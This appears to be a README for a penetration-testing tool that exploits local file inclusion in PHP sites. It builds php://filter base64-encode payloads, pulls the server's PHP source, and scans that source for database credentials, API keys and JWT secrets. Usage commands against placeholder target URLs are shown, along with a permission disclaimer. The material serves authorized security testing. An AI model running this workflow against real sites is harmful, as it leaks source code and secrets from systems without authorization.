# PHP Filter Source Disclosure Tool

A Python utility to exploit PHP filter wrappers via LFI, extract PHP source code, and flag potential secrets.

## Features
- **Modular Design**: Run each phase independently or as a full pipeline
- Discovers PHP files via `ffuf` (fast) or a built-in wordlist loop
- Builds `php://filter/read=convert.base64-encode/resource=...` payloads automatically
- Extracts and decodes base64-wrapped PHP source
- Scans extracted code for common secrets (DB creds, API keys, JWT secrets, include paths)
- Saves recovered sources and a summary report

## Requirements
- Python 3.8+
- `requests` (`pip install requests`)
- Optional: `ffuf` in PATH for faster discovery (`go install github.com/ffuf/ffuf@latest`)

## Independent Phase Execution

The tool now supports running each phase independently:

### Phase 1: Discover PHP Files
Finds PHP files and saves them to a list for later use.

```bash
python3 main.py discover -u "http://target.com/index.php?page=home" -p page -w php_files.txt -o discovered.txt
```

**Options:**
- `-u, --url`: Target URL
- `-p, --param`: Vulnerable parameter name
- `-w, --wordlist`: Wordlist for fuzzing
- `-o, --output`: Output file (default: `discovered_files.txt`)
- `--use-ffuf`: Use ffuf (default)
- `--no-ffuf`: Use built-in discovery

**Output:** A text file containing discovered PHP file paths.

### Phase 2: Extract Base64 Content
Fetches PHP files using filter wrappers and saves raw base64 responses.

```bash
python3 main.py extract -u "http://target.com/index.php?page=home" -p page -f discovered.txt -o extracted_raw
```

**Options:**
- `-u, --url`: Target URL
- `-p, --param`: Vulnerable parameter name
- `-f, --files`: File list (path to .txt file or comma-separated names)
- `-o, --output`: Output directory (default: `extracted_raw`)

**Output:** 
- `.b64` files containing raw base64 responses
- `manifest.json` tracking extracted files

### Phase 3: Decode and Analyze
Decodes base64 files, validates PHP source, and scans for secrets.

```bash
python3 main.py decode -i extracted_raw -o php_sources
```

**Options:**
- `-i, --input`: Input directory with .b64 files
- `-o, --output`: Output directory (default: `php_sources`)

**Output:**
- Decoded `.php` files
- `secrets_report.txt` with findings

## Full Pipeline (Legacy Mode)

Run all phases in sequence:

```bash
python3 main.py full -u "http://target.com/index.php?page=home" -p page -w php_files.txt
```

**Options:**
- `-u, --url`: Target URL
- `-p, --param`: Vulnerable parameter name
- `-w, --wordlist`: Wordlist for discovery
- `-f, --files`: Comma-separated list of specific files (skips discovery)
- `-o, --output`: Output directory (default: `php_sources`)
- `--no-ffuf`: Use built-in discovery

## Workflow Examples

### Example 1: Full Independent Workflow
```bash
# Step 1: Discover files
python3 main.py discover -u "http://target.com/page.php?file=home" -p file -w php_common.txt -o found.txt

# Step 2: Extract base64
python3 main.py extract -u "http://target.com/page.php?file=home" -p file -f found.txt -o raw_data

# Step 3: Decode and analyze
python3 main.py decode -i raw_data -o sources
```

### Example 2: Extract from Manual List
```bash
# Create a manual file list
echo -e "config\nindex\nadmin" > targets.txt

# Extract directly
python3 main.py extract -u "http://target.com/page.php?file=home" -p file -f targets.txt -o raw_data

# Decode
python3 main.py decode -i raw_data -o sources
```

### Example 3: Resume from Extracted Data
If you already have `.b64` files from a previous run:

```bash
python3 main.py decode -i old_extraction_folder -o new_analysis
```

## Usage
```bash
python3 main.py -u "http://target.com/index.php?page=home" -p page -w php_files.txt
```

### Arguments
- `-u, --url`      Target URL (include the vulnerable parameter)
- `-p, --param`    Vulnerable parameter name
- `-w, --wordlist` Wordlist for PHP file discovery (used with ffuf or built-in)
- `-f, --files`    Comma-separated list of specific files to test directly (bypasses discovery)
- `-o, --output`   Output directory for saved sources/report (default: `php_sources`)
- `--no-ffuf`      Use built-in discovery instead of ffuf

### Examples
- Fast discovery with ffuf:
```bash
python3 main.py -u "http://target.com/index.php?page=home" -p page -w php_files.txt
```
- Use built-in discovery (no ffuf installed):
```bash
python3 main.py -u "http://target.com/index.php?page=home" -p page -w php_files.txt --no-ffuf
```
- Test specific files directly:
```bash
python3 main.py -u "http://target.com/index.php?page=home" -p page -f config,index,admin -o results
```

## Benefits of Independent Execution

- **Flexibility**: Pause between phases, manually review results, or adjust targets
- **Efficiency**: Re-run only failed phases without repeating successful ones
- **Integration**: Pipe outputs to other tools or scripts between phases
- **Debugging**: Isolate issues to specific phases
- **Customization**: Use external tools for discovery or manual file lists

## Output
- **discover**: `discovered_files.txt` (or custom name) with found PHP files
- **extract**: Directory with `.b64` files and `manifest.json`
- **decode**: Directory with `.php` source files and `secrets_report.txt`
- **full**: Complete pipeline output in specified directory

## How It Works
1) **Discover**: Finds candidate PHP files (ffuf or built-in requests loop)
2) **Extract**: Crafts PHP filter payloads, requests them, extracts base64 from responses
3) **Decode**: Decodes base64 to PHP source, verifies PHP syntax, scans for secrets

## Legal / Safety
Use only on targets you have permission to test. Extracted secrets may be sensitive—handle and store results securely.
